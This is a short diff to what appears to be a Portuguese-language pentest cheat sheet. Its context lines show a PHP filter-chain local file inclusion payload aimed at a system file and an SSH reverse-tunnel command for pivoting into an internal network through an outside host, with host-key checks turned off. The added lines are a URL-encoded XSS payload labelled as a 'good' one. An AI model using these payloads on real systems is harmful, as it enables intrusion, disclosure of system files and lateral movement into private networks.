@@ -55,3 +55,6 @@ php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///et
 
 <h1>Log ssh pivoting rota interna </h1>
 ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -i ./id_rsa -R 8888:10.0.1.2:80 -N teste@103.106.0.2 &
+</br>
+<h2>Paylad xss bons</h2>
+%22%20onbeforeinput=alert(document.domain)%20contenteditable%20alt=%22
